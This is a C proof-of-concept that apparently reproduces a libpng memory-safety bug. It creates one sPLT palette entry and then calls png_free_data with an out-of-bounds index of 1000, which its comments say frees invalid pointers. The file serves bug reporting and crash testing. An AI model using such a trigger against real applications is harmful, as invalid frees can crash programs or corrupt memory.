#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <png.h>

int main(void) {
    // Create libpng read struct and info struct
    png_structp png_ptr = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png_ptr) {
        fprintf(stderr, "png_create_read_struct failed\n");
        return 1;
    }

    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) {
        fprintf(stderr, "png_create_info_struct failed\n");
        png_destroy_read_struct(&png_ptr, NULL, NULL);
        return 1;
    }

    // Set error handling (avoid abort on png_error)
    if (setjmp(png_jmpbuf(png_ptr))) {
        fprintf(stderr, "libpng error via longjmp (unexpected in setup)\n");
        png_destroy_info_struct(png_ptr, &info_ptr);
        png_destroy_read_struct(&png_ptr, NULL, NULL);
        return 1;
    }

    // Prepare a minimal sPLT chunk with one entry so that
    // info_ptr->splt_palettes becomes non-NULL and count is 1
    png_sPLT_entry entries[1];
    memset(entries, 0, sizeof(entries));
    entries[0].red = 1;
    entries[0].green = 2;
    entries[0].blue = 3;
    entries[0].alpha = 255;
    entries[0].frequency = 10;

    char name[] = "test_sPLT";

    png_sPLT_t splt;
    memset(&splt, 0, sizeof(splt));
    splt.name = name;
    splt.depth = 8;          // 8-bit entries
    splt.nentries = 1;       // one palette entry
    splt.entries = entries;  // pointer to our single entry

    // This call makes libpng allocate/copy internal sPLT structures
    // and mark them for freeing (sets info_ptr->free_me |= PNG_FREE_SPLT)
    png_set_sPLT(png_ptr, info_ptr, &splt, 1);

    // Trigger the vulnerability by freeing a single sPLT entry with an
    // out-of-bounds index. The library code does not bounds-check 'num'
    // against info_ptr->splt_palettes_num and will index OOB and call
    // png_free() on bogus pointers.
    int oob_index = 1000; // larger than splt_palettes_num (which is 1)
    png_free_data(png_ptr, info_ptr, PNG_FREE_SPLT, oob_index);

    // Cleanup (may not be reached if ASan/invalid free aborts first)
    png_destroy_info_struct(png_ptr, &info_ptr);
    png_destroy_read_struct(&png_ptr, NULL, NULL);
    return 0;
}
